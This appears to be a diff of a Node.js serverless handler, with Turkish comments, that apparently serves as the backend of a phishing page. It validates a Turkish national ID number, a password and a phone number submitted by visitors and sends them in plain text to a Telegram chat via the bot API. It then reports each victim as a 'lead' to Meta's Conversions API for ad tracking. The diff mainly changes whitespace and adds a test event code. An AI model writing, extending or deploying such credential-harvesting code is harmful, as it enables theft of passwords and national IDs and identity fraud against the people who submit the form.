@@ -15,19 +15,19 @@ export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-
+  
   // OPTIONS ön uç isteklerini işle
   if (req.method === 'OPTIONS') {
     return res.status(200).end();
   }
-
+  
   if (req.method !== 'POST') {
     return res.status(405).json({ message: 'Yalnızca POST istekleri desteklenir.' });
   }
-
+  
   try {
     const { tc, password, phone, eventID, fbp, fbc } = req.body || {};
-
+    
     // Doğrulama
     if (!tc || tc.length !== 11 || !/^\d+$/.test(tc)) {
       return res.status(400).json({ message: 'Geçersiz TC numarası.' });
@@ -41,7 +41,7 @@ export default async function handler(req, res) {
     if (!eventID) {
       return res.status(400).json({ message: 'Event ID eksik.' });
     }
-
+    
     // Telegram mesajı
     const message = `TC: ${tc}\nŞifre: ${password}\nTelefon Numarası: ${phone}`;
     console.log('Gönderilen veri:', {
@@ -50,7 +50,7 @@ export default async function handler(req, res) {
       phone: phone.substring(0, 3) + '****' + phone.substring(7),
       eventID: eventID.substring(0, 8) + '...',
     });
-
+    
     // Telegram ortam değişkenleri
     const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -58,7 +58,7 @@ export default async function handler(req, res) {
       console.error('Telegram ortam değişkenleri eksik!');
       return res.status(500).json({ message: 'Sunucu yapılandırma hatası.' });
     }
-
+    
     // Telegram'a veri gönder
     const telegramResponse = await axios.post(
       `https://api.telegram.org/bot${telegramToken}/sendMessage`,
@@ -69,7 +69,7 @@ export default async function handler(req, res) {
       { timeout: 10000 }
     );
     console.log('Telegram yanıtı:', telegramResponse.data);
-
+    
     if (telegramResponse.data.ok) {
       // Conversions API için veri hazırlığı
       const normalizedPhone = `+90${phone}`;
@@ -81,7 +81,7 @@ export default async function handler(req, res) {
       const currentHost = req.headers['x-forwarded-host'] || req.headers['host'] || 'fallback-domain.com';
       const protocol = req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
       const dynamicUrl = `${protocol}://${currentHost}/telefon`;
-
+      
       const payload = {
         data: [
           {
@@ -101,10 +101,11 @@ export default async function handler(req, res) {
               content_category: 'lead_form',
               content_name: 'phone_verification',
             },
+            test_event_code: 'TEST69639', // Test kodu eklendi
           },
         ],
       };
-
+      
       // Meta ortam değişkenleri
       const metaToken = process.env.META_CONVERSIONS_TOKEN;
       const pixelId = process.env.META_PIXEL_ID;
@@ -112,20 +113,20 @@ export default async function handler(req, res) {
         console.error('Meta Conversions token veya Pixel ID eksik! Env: META_CONVERSIONS_TOKEN ve META_PIXEL_ID');
         return res.status(500).json({ message: 'Meta yapılandırma hatası.' });
       }
-
+      
       const metaResponse = await axios.post(
         `https://graph.facebook.com/v20.0/${pixelId}/events?access_token=${metaToken}`,
         payload,
         { timeout: 10000 }
       );
       console.log('Conversions API yanıtı:', metaResponse.data);
-
+      
       if (metaResponse.data.events_received) {
         console.log(`Başarılı: ${metaResponse.data.events_received} event gönderildi. Event ID: ${eventID.substring(0, 8)}...`);
       } else {
         console.error('Conversions API hatası:', metaResponse.data);
       }
-
+      
       return res.status(200).json({ message: 'Bilgiler gönderildi.' });
     } else {
       console.error('Telegram API hatası:', telegramResponse.data);
